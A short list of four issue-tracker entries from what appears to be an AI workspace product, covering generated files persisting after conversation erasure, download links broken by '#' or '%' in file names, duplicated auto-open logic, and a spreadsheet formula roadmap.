- #3212 Generated files (spreadsheet, PowerPoint) survive conversation erasure
- #3213 Workspace download links break on file names containing # or %
- #3214 Deduplicate the capability card auto-open heuristic (4 copies)
- #3215 Spreadsheet capability v2 roadmap (per-row formulas partially delivered here: computed columns with add, subtract, multiply, divide, share of total; other functions and cross-sheet formulas stay on the roadmap)
